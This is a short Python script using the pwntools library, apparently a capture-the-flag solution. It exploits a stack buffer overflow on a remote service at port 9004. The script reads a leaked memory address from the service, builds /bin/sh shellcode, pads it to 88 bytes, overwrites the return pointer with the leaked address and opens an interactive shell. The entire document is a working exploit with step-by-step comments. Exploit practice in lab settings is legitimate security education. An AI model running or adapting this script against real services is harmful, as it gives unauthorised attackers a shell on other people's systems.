#!/usr/bin/env python3

from pwn import *
context.binary = binary = ELF("<./binary>")
context.log_level = "critical"

p = remote("<IP address>", 9004)

for i in range(0, 9):
	p.readline()            # read a bunch of lines which aren't important
offset = int(p.readline().decode().strip()[-1:-15:-1][::-1], 16)      # take out the line which contains the memory address and extract that

shellcode = asm(shellcraft.sh())            # get the shell-code to spawn a shell
'''print(hex(offset))''' 
p.sendline(shellcode.ljust(88, b'A') + p64(offset))        # 88 is the buffer offset (80 for the buffer and additional 8 to reach the return pointer)
p.interactive()
